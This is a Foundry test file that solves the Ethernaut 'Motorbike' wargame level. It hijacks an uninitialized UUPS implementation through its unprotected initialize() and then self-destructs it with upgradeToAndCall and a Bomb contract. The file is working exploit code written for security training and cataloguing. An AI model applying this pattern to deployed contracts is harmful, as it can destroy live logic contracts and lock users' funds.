// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #25 "Motorbike" → Aegis catalog `unprotected-privileged-fn`.
/// The Engine (the UUPS logic behind the proxy) is initialized only in the *proxy's* storage during
/// the proxy constructor — the Engine's own storage is never initialized. So anyone can call
/// `Engine.initialize()` directly to become `upgrader`, then `upgradeToAndCall` to delegatecall a
/// `selfdestruct` into the Engine. Win condition (MotorbikeFactory): the Engine has no code.
/// (Cross-version: Engine is <0.7.0, deployed via `deployCode`; evm_version=paris keeps classic
/// SELFDESTRUCT semantics.)
interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract Bomb {
    function boom() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    address attacker = makeAddr("attacker");
    address engine;

    // The exploit runs in setUp (a separate call from the test): SELFDESTRUCT's code removal is
    // finalized at transaction end, so the destroyed Engine is observable in the test body.
    function setUp() public {
        // Mirror the level: deploy the Engine, then the Motorbike proxy pointing at it (the proxy
        // ctor initializes the PROXY storage, leaving the Engine itself uninitialized).
        engine = deployCode("Motorbike.sol:Engine");
        deployCode("Motorbike.sol:Motorbike", abi.encode(engine));
        assertEq(IEngine(engine).upgrader(), address(0), "Engine's own storage is uninitialized");

        vm.startPrank(attacker);
        IEngine(engine).initialize(); // unprotected initializer on the Engine itself
        assertEq(IEngine(engine).upgrader(), attacker, "attacker seized the upgrader role");
        Bomb bomb = new Bomb();
        IEngine(engine).upgradeToAndCall(address(bomb), abi.encodeWithSignature("boom()"));
        vm.stopPrank();
    }

    function test_solve_motorbike() public view {
        assertEq(engine.code.length, 0, "Motorbike solved: Engine self-destructed");
    }
}
